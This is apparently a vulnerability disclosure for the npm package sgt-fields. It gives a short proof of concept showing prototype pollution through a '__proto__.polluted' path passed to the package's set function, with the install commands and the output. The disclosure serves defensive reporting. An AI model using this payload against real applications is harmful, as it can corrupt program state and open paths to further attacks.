# Description

`sgt-fields` is vulnerable to `Prototype Pollution`.

# Proof of Concept

1. Create the following PoC file:

```
// poc.js
var sgtFields = require("sgt-fields")
var obj = {}
console.log("Before : " + {}.polluted);
sgtFields.set(obj,"__proto__.polluted","Yes! Its Polluted");
console.log("After : " + {}.polluted);
```


2. Execute the following commands in terminal:

```
npm i sgt-fields # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output:
```
Before : undefined
After : Yes! Its Polluted
```
